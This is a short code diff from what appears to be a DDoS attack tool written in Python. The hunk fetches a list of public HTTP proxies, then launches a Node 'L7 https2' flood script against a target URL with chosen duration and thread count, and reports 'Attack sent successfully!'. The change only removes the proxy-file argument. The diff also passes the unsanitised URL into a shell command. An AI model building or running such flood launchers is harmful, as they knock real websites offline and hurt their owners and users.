@@ -599,7 +599,7 @@ class Tool:
 					F_Tool.styleText("\n [*] Downloading Proxy...\n")
 					with open("utils/http.txt", 'w') as p:
 						p.write(httpx.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all").text)
-					subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} {thread} http.txt'], shell=True)
+					subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} {thread}'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
